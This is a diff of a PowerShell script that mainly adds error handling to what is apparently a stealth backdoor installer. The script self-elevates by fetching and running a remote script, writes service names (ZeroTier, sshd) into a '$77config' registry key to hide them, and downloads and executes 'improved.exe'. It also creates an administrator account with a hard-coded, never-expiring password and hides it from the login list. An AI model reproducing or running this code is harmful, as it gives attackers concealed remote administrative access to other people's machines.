@@ -1,3 +1,13 @@
+# Function to handle errors with an option to stop the script
+function Handle-Error {
+    param([string]$message, [bool]$exit = $false)
+    Write-Host "Error: $message" -ForegroundColor Red
+    if ($exit) {
+        Read-Host -Prompt "Press Enter to exit"
+        exit
+    }
+}
+
 # Check for administrator privileges and request elevation if needed
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     # Command to download and execute the script from the URL
@@ -46,32 +56,28 @@ $baseConfigPath = "HKLM\SOFTWARE\$77config"
 
 # Commands to ensure the $77config key and necessary subkeys exist
 $ensurePathsCommands = @(
-    "reg add ""$baseConfigPath"" /f",
-    "reg add ""$baseConfigPath\service_names"" /f",
-    "reg add ""$baseConfigPath\process_names"" /f"
+    "reg add `"$baseConfigPath`" /f",
+    "reg add `"$baseConfigPath\service_names`" /f",
+    "reg add `"$baseConfigPath\process_names`" /f"
 )
 
-foreach ($cmdCommand in $ensurePathsCommands) {
-    Start-Process cmd.exe -ArgumentList "/c", $cmdCommand -Wait
+foreach ($cmd in $ensurePathsCommands) {
+    try {
+        Start-Process cmd.exe -ArgumentList "/c", $cmd -Wait
+    } catch {
+        Handle-Error -message "Failed to add registry key: $cmd"
+    }
 }
 
-# Define service names to hide - ZeroTier and SSH service
-$servicesToHide = @("ZeroTierOneService", "sshd") # Replace 'sshd' with your specific SSH service name if different
-
-# Hide specified services using reg add
+# Example of hiding services
+$servicesToHide = @("ZeroTierOneService", "sshd")
 foreach ($service in $servicesToHide) {
-    $cmdCommandService = "reg add ""$baseConfigPath\service_names"" /v $service /t REG_SZ /d $service /f"
-    Start-Process cmd.exe -ArgumentList "/c", $cmdCommandService -Wait
-}
-
-# Add reg.exe to the list of processes to hide
-$processesToHide = @("reg.exe") # Add any additional process names here
-
-# Hide specified processes using reg add
-foreach ($process in $processesToHide) {
-    # For clarity and consistency, use the process name both as the value name and the value
-    $cmdCommandProcess = "reg add ""$baseConfigPath\process_names"" /v $process /t REG_SZ /d $process /f"
-    Start-Process cmd.exe -ArgumentList "/c", $cmdCommandProcess -Wait
+    try {
+        $cmdCommandService = "reg add `"$baseConfigPath\service_names`" /v $service /t REG_SZ /d $service /f"
+        Start-Process cmd.exe -ArgumentList "/c", $cmdCommandService -Wait
+    } catch {
+        Handle-Error -message "Failed to hide service: $service"
+    }
 }
 
 # Define the URL and download location for improved.exe
@@ -91,7 +97,7 @@ Remove-Item $exePath -Force
 # Create a new user `ssh-user` with administrative privileges
 $userName = "ssh-user"
 $password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
-New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires
+New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires -Force
 Add-LocalGroupMember -Group "Administrators" -Member $userName
 
 # Path to the SpecialAccounts\UserList registry key
